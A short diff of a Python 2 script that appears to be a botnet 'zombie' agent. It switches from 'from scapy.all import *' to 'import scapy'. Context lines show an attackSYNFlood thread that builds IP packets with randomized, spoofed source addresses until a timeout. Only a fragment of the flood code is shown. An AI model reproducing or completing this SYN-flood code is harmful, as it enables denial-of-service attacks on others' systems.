@@ -6,7 +6,7 @@ import socket
 import urllib2
 import random
 import os
-from scapy.all import *
+import scapy
 
 class zombie(SocketServer.BaseRequestHandler):
     def handle(self):
@@ -66,7 +66,7 @@ class attackSYNFlood(threading.Thread):
     def run(self):
         start = time.time()
         while time.time() - start < self.timeout:
-            ip = IP()
+            ip = scapy.IP()
             ip.src = "{0}.{1}.{2}.{3}".format(random.randint(1,254),
                                      random.randint(1,254),
                                      random.randint(1,254),
